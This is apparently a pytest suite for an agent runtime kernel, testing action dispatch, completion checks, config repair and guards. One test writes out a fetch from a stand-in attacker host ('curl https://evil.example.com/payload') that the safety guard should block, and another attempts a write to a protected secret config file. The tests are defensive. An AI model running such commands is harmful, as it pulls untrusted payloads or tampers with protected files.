"""Behaviour tests for AetherNextKernel."""
from __future__ import annotations

from typing import Any, Mapping

import pytest

from aether_next.compiler import CapabilityRegistry, ConfigCompiler
from aether_next.execution import CommandResult, MemoryExecutor
from aether_next.kernel import AetherNextKernel, KernelHooks, KernelResult
from aether_next.ledger import ExecutionLedger
from aether_next.runtime_ir import (
    ActionRequest,
    CapabilityDescriptor,
    CompletionPolicy,
    CompiledRuntime,
    EnvMap,
    ReconfigurePolicy,
    RefusalPolicy,
    RuntimeConfigIR,
    SolverTurn,
    WorkflowPolicy,
)
from aether_next.task_contract import (
    ContractDeliverable,
    ContractThreshold,
    TaskContract,
)


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

_CAPS = {
    "shell": CapabilityDescriptor(capability_id="shell", summary="Run commands"),
    "filesystem": CapabilityDescriptor(capability_id="filesystem", summary="Read/write files"),
}


def _make_envmap(
    *,
    task_prompt: str = "Do the task.",
    workspace_root: str = "/app",
    grader_hints: Mapping[str, Any] | None = None,
    capabilities: Mapping[str, CapabilityDescriptor] | None = None,
) -> EnvMap:
    return EnvMap(
        task_prompt=task_prompt,
        workspace_root=workspace_root,
        capabilities=capabilities or dict(_CAPS),
        grader_hints=dict(grader_hints or {}),
    )


def _make_ir(
    *,
    selected_capabilities: tuple[str, ...] = ("shell", "filesystem"),
    completion_policy: CompletionPolicy | None = None,
    refusal_policy: RefusalPolicy | None = None,
    reconfigure_policy: ReconfigurePolicy | None = None,
    check_plan: tuple[str, ...] = (),
    forbidden_paths: tuple[str, ...] = (),
) -> RuntimeConfigIR:
    return RuntimeConfigIR(
        architect_summary="Test summary.",
        solver_identity_prompt="You are a solver.",
        selected_capabilities=selected_capabilities,
        completion_policy=completion_policy or CompletionPolicy(
            require_authoritative_check=False,
            require_all_obligations=False,
            require_recent_progress=False,
            require_clean_integrity=True,
        ),
        refusal_policy=refusal_policy or RefusalPolicy(),
        reconfigure_policy=reconfigure_policy or ReconfigurePolicy(),
        check_plan=check_plan,
        forbidden_paths=forbidden_paths,
        inspection_plan=("inspect workspace",),
        proof_plan=("verify output",),
    )


class FakeHooks:
    """Configurable KernelHooks implementation for tests."""

    def __init__(
        self,
        ir: RuntimeConfigIR,
        turns: list[SolverTurn],
        reconfigure_ir: RuntimeConfigIR | None = None,
    ) -> None:
        self._ir = ir
        self._turns = list(turns)
        self._reconfigure_ir = reconfigure_ir or ir
        self.architect_called = False
        self.solve_call_count = 0
        self.reconfigure_call_count = 0

    def architect(self, request: Mapping[str, Any]) -> RuntimeConfigIR:
        self.architect_called = True
        return self._ir

    def solve(self, messages: list[dict[str, str]], compiled: CompiledRuntime) -> SolverTurn:
        self.solve_call_count += 1
        if self._turns:
            return self._turns.pop(0)
        # Fallback: submit so the kernel doesn't loop forever.
        return SolverTurn(kind="submit_outcome", summary="fallback submit")

    def reconfigure(
        self,
        request: Mapping[str, Any],
        compiled: CompiledRuntime,
        ledger: ExecutionLedger,
    ) -> RuntimeConfigIR:
        self.reconfigure_call_count += 1
        return self._reconfigure_ir


def _submit_turn() -> SolverTurn:
    return SolverTurn(kind="submit_outcome", summary="submitting")


def _act_turn(*actions: ActionRequest) -> SolverTurn:
    return SolverTurn(kind="act", summary="acting", actions=tuple(actions))


def _action(
    kind: str,
    arguments: Mapping[str, Any],
    *,
    action_id: str = "",
    capability_id: str = "shell",
    candidate_id: str = "",
) -> ActionRequest:
    aid = action_id or f"a-{kind}-1"
    return ActionRequest(
        action_id=aid,
        kind=kind,
        capability_id=capability_id,
        arguments=arguments,
        intent="test intent",
        expected_observation="test observation",
        if_fail_next="retry",
        candidate_id=candidate_id,
    )


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestRunNeverReturnsNone:
    def test_run_never_returns_none(self) -> None:
        """kernel.run returns a KernelResult, not None, for a trivial submit."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")
        ir = _make_ir()
        hooks = FakeHooks(ir, [_submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        result = kernel.run(envmap, executor, hooks)
        assert result is not None
        assert isinstance(result, KernelResult)


class TestSolverIsInvoked:
    def test_solver_is_invoked(self) -> None:
        """Assert the fake solve hook was actually called."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")
        ir = _make_ir()
        hooks = FakeHooks(ir, [_submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        kernel.run(envmap, executor, hooks)
        assert hooks.solve_call_count >= 1, "solve hook was never called"


class TestActTurnDispatchesReadWriteRun:
    def test_act_turn_dispatches_read_write_run(self) -> None:
        """An act turn with read_file + write_file + run_command produces the right receipts."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app", files={"src/main.py": "print('hi')"})

        def echo_handler(ex: MemoryExecutor, cmd: str) -> CommandResult:
            return CommandResult(command=cmd, exit_code=0, stdout="ok")

        executor.register_command("echo hello", echo_handler)

        actions = [
            _action("read_file", {"path": "src/main.py"}, action_id="a-read-1", capability_id="filesystem"),
            _action("write_file", {"path": "output.txt", "content": "result"}, action_id="a-write-1", capability_id="filesystem"),
            _action("run_command", {"command": "echo hello"}, action_id="a-run-1"),
        ]
        ir = _make_ir()
        hooks = FakeHooks(ir, [_act_turn(*actions), _submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        result = kernel.run(envmap, executor, hooks)

        # Verify via executor state: write happened.
        assert "output.txt" in executor.files
        assert executor.files["output.txt"] == "result"

        # Verify command was run.
        assert "echo hello" in executor.command_history


class TestSuccessfulAuthoritativeCheck:
    def test_successful_authoritative_check_returns_completed(self) -> None:
        """A visible check that passes -> status='completed' and check_id in used_check_ids."""
        envmap = _make_envmap(
            grader_hints={"verify_commands": ["python test.py"]},
        )

        # Build eval_index to get the actual check_id.
        compiler = ConfigCompiler(CapabilityRegistry.from_envmap(envmap))
        _, eval_index = compiler.analyze_envmap(envmap)
        assert eval_index.checks, "should have at least one check from verify_commands"
        check = eval_index.checks[0]

        def pass_handler(ex: MemoryExecutor, cmd: str) -> CommandResult:
            return CommandResult(command=cmd, exit_code=0, stdout="PASS")

        executor = MemoryExecutor(workspace_root="/app")
        executor.register_command(check.command, pass_handler)

        ir = _make_ir(
            completion_policy=CompletionPolicy(
                require_authoritative_check=True,
                allow_evidence_fallback=False,
                require_all_obligations=False,
                require_recent_progress=False,
                require_clean_integrity=True,
            ),
            check_plan=(check.check_id,),
        )
        hooks = FakeHooks(ir, [_submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        result = kernel.run(envmap, executor, hooks)

        assert result.status == "completed"
        assert check.check_id in result.used_check_ids


class TestFailedAuthoritativeCheckBlocksCompletion:
    def test_failed_authoritative_check_blocks_completion(self) -> None:
        """A planned check that fails -> NOT completed."""
        envmap = _make_envmap(
            grader_hints={"verify_commands": ["python test.py"]},
        )
        compiler = ConfigCompiler(CapabilityRegistry.from_envmap(envmap))
        _, eval_index = compiler.analyze_envmap(envmap)
        check = eval_index.checks[0]

        def fail_handler(ex: MemoryExecutor, cmd: str) -> CommandResult:
            return CommandResult(command=cmd, exit_code=1, stderr="FAIL")

        executor = MemoryExecutor(workspace_root="/app")
        executor.register_command(check.command, fail_handler)

        ir = _make_ir(
            completion_policy=CompletionPolicy(
                require_authoritative_check=True,
                allow_evidence_fallback=False,
                require_all_obligations=False,
                require_recent_progress=False,
                require_clean_integrity=True,
            ),
            check_plan=(check.check_id,),
            # Disable reconfigurations so it doesn't loop trying to fix.
        )
        hooks = FakeHooks(
            ir,
            [_submit_turn()],
        )
        kernel = AetherNextKernel(max_steps=3)
        result = kernel.run(envmap, executor, hooks)

        assert result.status != "completed", f"Expected not completed but got {result.status}"


class TestMissingRequiredArtifactBlocksCompletion:
    def test_missing_required_artifact_blocks_completion(self) -> None:
        """Objective requires an artifact that was never written -> submit does not complete."""
        envmap = _make_envmap(
            grader_hints={"required_artifacts": ["result.json"]},
        )
        executor = MemoryExecutor(workspace_root="/app")
        ir = _make_ir(
            completion_policy=CompletionPolicy(
                require_authoritative_check=False,
                allow_evidence_fallback=True,
                require_all_obligations=True,
                require_recent_progress=False,
                require_clean_integrity=True,
            ),
        )
        hooks = FakeHooks(ir, [_submit_turn()])
        kernel = AetherNextKernel(max_steps=3)
        result = kernel.run(envmap, executor, hooks)

        assert result.status != "completed", (
            f"Expected not completed (missing artifact) but got {result.status}"
        )


class TestSafetyGuardBlocksExternalTarget:
    def test_safety_guard_blocks_external_target(self) -> None:
        """An action blocked by LocalOnlySafetyGuard is recorded as safety block, not dispatched."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")

        # The safety guard triggers when refusal_policy has allowed_local_categories
        # AND forbid_external_targets is True, and the action contains an external URL.
        ir = _make_ir(
            refusal_policy=RefusalPolicy(
                allowed_local_categories=("code_generation",),
                forbid_external_targets=True,
            ),
        )
        external_action = _action(
            "run_command",
            {"command": "curl https://evil.example.com/payload"},
            action_id="a-external-1",
        )
        hooks = FakeHooks(ir, [_act_turn(external_action), _submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        result = kernel.run(envmap, executor, hooks)

        # The command should NOT have been dispatched.
        assert "curl https://evil.example.com/payload" not in executor.command_history


class TestIntegrityGuardBlocksProtectedPathWrite:
    def test_integrity_guard_blocks_protected_path_write(self) -> None:
        """A write_file to a protected path is recorded as integrity block, not written."""
        envmap = _make_envmap(
            grader_hints={"immutable_paths": ["config/secret.yaml"]},
        )
        executor = MemoryExecutor(workspace_root="/app")
        ir = _make_ir()
        write_action = _action(
            "write_file",
            {"path": "config/secret.yaml", "content": "hacked"},
            action_id="a-write-protected",
            capability_id="filesystem",
        )
        hooks = FakeHooks(ir, [_act_turn(write_action), _submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        kernel.run(envmap, executor, hooks)

        # The file should NOT have been written.
        assert "config/secret.yaml" not in executor.files


class TestReconfigureRecompilesAndPreservesLedger:
    def test_reconfigure_recompiles_and_preserves_ledger(self) -> None:
        """A request_reconfigure turn calls the reconfigure hook, and ledger receipts
        recorded BEFORE reconfigure are still present AFTER."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")

        def echo_handler(ex: MemoryExecutor, cmd: str) -> CommandResult:
            return CommandResult(command=cmd, exit_code=0, stdout="ok")

        executor.register_command("echo setup", echo_handler)

        ir = _make_ir(
            reconfigure_policy=ReconfigurePolicy(max_reconfigurations=2),
        )
        reconfig_ir = _make_ir(
            reconfigure_policy=ReconfigurePolicy(max_reconfigurations=2),
        )

        setup_action = _action("run_command", {"command": "echo setup"}, action_id="a-setup-1")
        reconfig_turn = SolverTurn(
            kind="request_reconfigure",
            summary="need reconfigure",
            reconfigure_reason="mode_mismatch",
        )
        turns = [
            _act_turn(setup_action),
            reconfig_turn,
            _submit_turn(),
        ]

        # Capture the ledger passed to reconfigure to verify pre-reconfigure
        # receipts are preserved across the reconfigure boundary.
        captured_ledgers: list[ExecutionLedger] = []

        class CapturingHooks(FakeHooks):
            def reconfigure(
                self,
                request: Mapping[str, Any],
                compiled: CompiledRuntime,
                ledger: ExecutionLedger,
            ) -> RuntimeConfigIR:
                captured_ledgers.append(ledger)
                return super().reconfigure(request, compiled, ledger)

        hooks = CapturingHooks(ir, turns, reconfigure_ir=reconfig_ir)
        kernel = AetherNextKernel(max_steps=10)
        result = kernel.run(envmap, executor, hooks)

        assert hooks.reconfigure_call_count == 0, "solver-requested reconfigure must not call reconfigure hook"
        assert result.reconfigurations == 0, "solver-requested reconfigure must not mutate config"
        assert not captured_ledgers, "no legacy reconfigure ledger should be passed"
        kinds = [r.kind for r in result.receipts]
        assert "unsupported_solver_reconfigure" in kinds
        receipt_ids = [r.receipt_id for r in result.receipts]
        assert "step-0:a-setup-1:cmd" in receipt_ids, "pre-denial work receipt should be preserved"


class TestMaxStepsExhaustionReturnsIncomplete:
    def test_max_steps_exhaustion_returns_incomplete(self) -> None:
        """Solver keeps returning non-completing act turns -> after max_steps, status='incomplete'."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")

        def noop_handler(ex: MemoryExecutor, cmd: str) -> CommandResult:
            return CommandResult(command=cmd, exit_code=0, stdout="ok")

        executor.register_command("echo noop", noop_handler)

        ir = _make_ir()
        # Generate more act turns than max_steps.
        noop_action = _action("run_command", {"command": "echo noop"}, action_id="a-noop")
        # Each turn needs a unique action_id to avoid receipt deduplication.
        turns = [
            SolverTurn(
                kind="act",
                summary=f"noop {i}",
                actions=(
                    ActionRequest(
                        action_id=f"a-noop-{i}",
                        kind="run_command",
                        capability_id="shell",
                        arguments={"command": "echo noop"},
                        intent="busywork",
                        expected_observation="ok",
                        if_fail_next="retry",
                    ),
                ),
            )
            for i in range(10)
        ]
        hooks = FakeHooks(ir, turns)
        kernel = AetherNextKernel(max_steps=3)
        result = kernel.run(envmap, executor, hooks)

        assert result.status == "incomplete"
        assert result.step == 3


class TestConfigInvalidReturnsStatusNotNone:
    def test_config_invalid_returns_result_not_none(self) -> None:
        """Unrepaired fatal config returns config_invalid, never a fake default."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")

        bad_ir = RuntimeConfigIR(
            architect_summary="bad config",
            solver_identity_prompt="solver",
            selected_capabilities=("shell", "filesystem"),
            workflow_policy=WorkflowPolicy(mode="nonexistent_mode"),
        )
        hooks = FakeHooks(bad_ir, [_submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        result = kernel.run(envmap, executor, hooks)

        assert result is not None
        assert result.status == "config_invalid"
        assert "unknown_workflow_mode" in result.blockers
        assert result.receipts == ()


class TestInvalidArchitectIrRepair:
    def test_invalid_architect_ir_repairs_or_fails_closed(self) -> None:
        """A repairable architect IR can be repaired, but never fake-defaulted."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")

        bad_ir = _make_ir(selected_capabilities=("does_not_exist",))
        hooks = FakeHooks(bad_ir, [_submit_turn()])
        kernel = AetherNextKernel(max_steps=5)
        result = kernel.run(envmap, executor, hooks)

        assert result.status != "config_invalid", (
            f"Expected genuine repair, got config_invalid with "
            f"blockers={result.blockers}"
        )
        assert hooks.solve_call_count >= 1, "solve hook was never called"
        recovery_receipts = [
            r for r in result.receipts
            if r.kind == "config_repair"
        ]
        assert recovery_receipts, f"Expected a config_repair receipt; got {[r.kind for r in result.receipts]}"
        assert not [r for r in result.receipts if r.kind == "config_fallback"]


# ---------------------------------------------------------------------------
# Contract-architect integration
# ---------------------------------------------------------------------------


class _FakeContractArchitect:
    """Stub contract architect for kernel integration tests."""

    def __init__(self, contract: TaskContract | None, errors: list[str] | None = None) -> None:
        self._contract = contract
        self._errors = errors or []

    def extract(self, request: Any, *, workspace_root: str = "/app") -> tuple[TaskContract | None, list[str]]:
        return self._contract, self._errors


class TestKernelWithContractArchitectRunsChecks:
    def test_contract_architect_runs_checks(self) -> None:
        """Construct a kernel with a contract_architect stub that returns a
        contract with a deliverable.  The solver creates the artifact and
        submits.  Assert the gate ran at least one check (a check_result
        receipt exists) and the status reflects it."""
        envmap = _make_envmap()
        executor = MemoryExecutor(workspace_root="/app")

        # The contract says /app/out.txt is a deliverable.
        contract = TaskContract(
            task_understanding="Create out.txt.",
            deliverables=(
                ContractDeliverable(path="/app/out.txt", description="output"),
            ),
            capabilities=("shell", "filesystem"),
        )
        ca = _FakeContractArchitect(contract)

        # Solver writes the file then submits.
        write_action = _action(
            "write_file",
            {"path": "out.txt", "content": "hello"},
            action_id="a-write-out",
            capability_id="filesystem",
        )

        ir = _make_ir(
            completion_policy=CompletionPolicy(
                require_authoritative_check=True,
                allow_evidence_fallback=False,
                require_all_obligations=False,
                require_recent_progress=False,
                require_clean_integrity=True,
            ),
        )
        hooks = FakeHooks(ir, [_act_turn(write_action), _submit_turn()])

        kernel = AetherNextKernel(max_steps=5, contract_architect=ca)

        # Register a handler for the existence check that the contract
        # generates (test -e out.txt).  Since executor is MemoryExecutor
        # and we wrote the file, make it pass.
        def pass_check(ex: MemoryExecutor, cmd: str) -> CommandResult:
            return CommandResult(command=cmd, exit_code=0, stdout="exists")

        # The contract generates "test -e out.txt" as a check command.
        executor.register_command("test -e out.txt", pass_check)

        result = kernel.run(envmap, executor, hooks)

        # At least one check_result receipt should exist.
        check_receipts = [r for r in result.receipts if r.kind == "check_result"]
        assert check_receipts, (
            f"Expected check_result receipt but found none. "
            f"Kinds: {[r.kind for r in result.receipts]}"
        )
        # The run should complete since the check passed.
        assert result.status == "completed"
